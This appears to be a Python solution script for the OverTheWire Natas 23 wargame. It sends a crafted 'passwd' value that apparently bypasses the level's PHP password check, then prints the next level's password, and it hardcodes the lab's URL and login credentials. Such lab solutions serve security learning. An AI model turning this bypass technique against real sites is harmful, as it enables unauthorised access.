import requests
import re

def flag(url,username,password):
    site = requests.get(url+"index.php?passwd=11iloveyou",auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    flag = re.findall("Password:(.*)</pre>",site.text)
    print("The flag for natas23 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas23.natas.labs.overthewire.org/"
    username = "natas23"
    password = "qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj"
    flag(url,username,password)